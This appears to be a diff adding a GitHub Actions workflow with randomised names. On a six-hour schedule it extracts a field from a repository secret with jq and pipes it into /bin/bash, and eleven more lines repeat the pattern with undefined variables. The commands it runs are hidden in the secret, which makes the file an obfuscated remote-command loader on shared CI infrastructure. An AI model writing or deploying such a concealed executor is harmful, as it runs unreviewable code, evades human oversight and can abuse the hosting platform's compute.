@@ -1,0 +1,29 @@
+name: luanyunping2345
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luanyunping2345
+        env:
+          pysg04: ${{ secrets.pysg04 }}
+        run: |
+          echo $pysg04 | jq -r .eij54939 | /bin/bash
+          echo $uay30175 | jq -r .w4968 | /bin/bash
+          echo $im4 | jq -r .efket36546 | /bin/bash
+          echo $e07118 | jq -r .hcp6 | /bin/bash
+          echo $aen96 | jq -r .qsv27 | /bin/bash
+          echo $xtsbk39 | jq -r .rq355 | /bin/bash
+          echo $q3042 | jq -r .fc952 | /bin/bash
+          echo $btco0 | jq -r .sgic74 | /bin/bash
+          echo $nxf3342 | jq -r .xwp38422 | /bin/bash
+          echo $f7591 | jq -r .pqa54 | /bin/bash
+          echo $u36657 | jq -r .abci04 | /bin/bash
+          echo $ooh1129 | jq -r .cgoi27386 | /bin/bash
+
